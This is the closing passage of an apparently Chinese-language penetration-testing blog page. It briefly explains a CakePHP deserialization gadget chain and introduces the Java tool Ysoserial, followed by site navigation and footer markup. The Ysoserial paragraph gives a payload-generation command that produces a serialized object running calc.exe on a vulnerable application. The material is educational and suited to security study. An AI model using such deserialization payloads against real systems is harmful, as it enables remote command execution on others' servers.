+</div><p>例如， <code>CakePHP/RCE1</code> 的输出表示名为 <code>CakePHP/RCE1</code> 的小工具链利用了 CakePHP <code>3.9.6</code> 及以上版本中的 RCE 漏洞 。该漏洞允许攻击者利用 <code>__destruct</code> 魔术方法在服务器上执行任意命令。</p>
+<h3 id="java-版-ysoserial">Java 版 Ysoserial
+</h3><p>Ysoserial 是一款广受认可的漏洞利用工具，专门用于测试 Java 应用程序的序列化漏洞。它有助于生成利用这些漏洞的有效载荷，使其成为攻击者和渗透测试人员评估和利用 Java 序列化应用程序的必备工具。</p>
+<p>要使用 Ysoserial，攻击者通常会使用类似 <code>java -jar ysoserial.jar [payload type] '[command to execute]'</code> 的命令生成有效载荷，其中 <code>[payload type]</code> 表示漏洞利用类型， <code>[command to execute]</code> 表示攻击者希望在目标系统上运行的任意命令。例如，使用 <code>CommonsCollections1</code> 有效载荷类型可能如下所示： <code>java -jar ysoserial.jar CommonsCollections1 'calc.exe'</code> 。此命令生成一个序列化对象，当被存在漏洞的应用程序反序列化时，该对象将执行指定的命令。Ysoserial 可在 GitHub 上<a class="link" href="https://github.com/frohoff/ysoserial"  target="_blank" rel="noopener"
+    >下载 </a>。</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/burpsuite%E5%88%A9%E7%94%A8%E5%AE%8F%E7%88%86%E7%A0%B4%E5%9B%9E%E6%98%BE%E5%9C%A8%E5%93%8D%E5%BA%94%E5%8C%85%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BD%91%E9%A1%B5/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/ai-generated-8612487.jpg" loading="lazy" data-key="" data-hash="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/ai-generated-8612487.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Burpsuite利用宏爆破回显在响应包的验证码网页</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/idor%E5%9F%BA%E7%A1%80/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/54afbc538832e9159efdc2ac951b4fabecad8304bd717a9aece08e26440c0690.png" loading="lazy" data-key="" data-hash="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/54afbc538832e9159efdc2ac951b4fabecad8304bd717a9aece08e26440c0690.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">IDOR基础</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/ssrf-1/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/5e5493849d8aa623ccc456998df80032a5625b429097b062a957b14d4fce5079.png" loading="lazy" data-key="" data-hash="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/5e5493849d8aa623ccc456998df80032a5625b429097b062a957b14d4fce5079.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">SSRF-1</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/tomb-8622722.jpg" loading="lazy" data-key="" data-hash="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/tomb-8622722.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">常见工具及使用技巧</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/638445f84229dc4814eb81dfe06baeb837e3a5e8920ec39035d8dd6e02c0a10d.png" loading="lazy" data-key="" data-hash="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/638445f84229dc4814eb81dfe06baeb837e3a5e8920ec39035d8dd6e02c0a10d.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">文件包含基础</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2024 - 
+        
+        2025 Yerucrem
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
